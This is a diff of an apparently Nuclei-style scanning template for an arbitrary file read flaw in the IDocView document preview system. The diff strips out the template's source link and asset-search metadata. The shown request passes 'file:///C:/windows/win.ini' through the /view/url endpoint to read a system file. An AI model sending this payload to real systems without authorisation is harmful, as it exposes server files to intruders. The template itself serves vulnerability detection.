@@ -3,14 +3,8 @@ info:
   name: IDocView在线文档预览系统url存在任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4b9cf58ae8b7a8cdc8f464eacf0cf19e
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 4b9cf58ae8b7a8cdc8f464eacf0cf19e
-    fofa: + hunter`app.name="I Doc View"`
 http:
 - raw:
   - 'GET /view/url?url=file:///C:/windows/win.ini HTTP/1.1
